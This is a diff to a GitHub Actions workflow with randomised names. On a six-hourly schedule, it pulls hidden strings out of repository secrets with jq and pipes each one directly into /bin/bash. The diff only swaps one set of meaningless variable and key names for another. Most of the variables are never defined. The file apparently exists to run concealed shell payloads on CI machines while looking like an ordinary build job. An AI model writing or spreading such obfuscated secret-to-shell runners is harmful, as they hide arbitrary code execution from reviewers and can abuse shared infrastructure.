@@ -3,23 +3,24 @@ name: yanjingwu1819
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 2/6 * * *'
-
-jobs:  # 20777
+    - cron: '50 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yanjingwu1819
         env:
-          y88170: ${{ secrets.y88170 }}
+          n4: ${{ secrets.n4 }}
         run: |
-          echo $y88170 | jq -r .vuh5112 | /bin/bash
-          echo $gm1 | jq -r .cmy604 | /bin/bash
-          echo $xo15 | jq -r .oct3911 | /bin/bash
-          echo $g5 | jq -r .zdxc4 | /bin/bash
-          echo $wmwxu4312 | jq -r .d3437 | /bin/bash
-          echo $l1 | jq -r .rddi1 | /bin/bash
-          echo $imm1720 | jq -r .edfa3777 | /bin/bash
-          echo $hii1277 | jq -r .qhqfi4 | /bin/bash
+          echo $n4 | jq -r .tpzg44 | /bin/bash
+          echo $euzte9 | jq -r .pbtvt71267 | /bin/bash
+          echo $zmu37957 | jq -r .rdaoc9464 | /bin/bash
+          echo $epkej63409 | jq -r .ax63111 | /bin/bash
+          echo $zqf5018 | jq -r .fwqx024 | /bin/bash
+          echo $r19624 | jq -r .awo92678 | /bin/bash
+          echo $zvg69 | jq -r .cuirt3 | /bin/bash
+          echo $ituj2210 | jq -r .w6396 | /bin/bash
+          echo $p21086 | jq -r .vu732 | /bin/bash
+          echo $gcka060 | jq -r .zw5 | /bin/bash
 
